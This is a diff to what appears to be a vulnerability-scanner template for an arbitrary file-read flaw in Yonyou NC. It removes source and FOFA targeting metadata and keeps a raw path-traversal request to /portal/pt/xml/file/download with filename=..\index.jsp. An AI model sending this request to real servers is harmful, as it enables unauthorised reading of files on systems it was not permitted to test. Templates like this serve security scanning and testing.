@@ -3,12 +3,8 @@ info:
   name: 用友NC存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wppuniowokasr46m'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wppuniowokasr46m
-    fofa: app="用友-UFIDA-NC" title="YONYOU NC"
 http:
 - raw:
   - 'GET /portal/pt/xml/file/download?pageId=login&filename=..\index.jsp HTTP/1.1
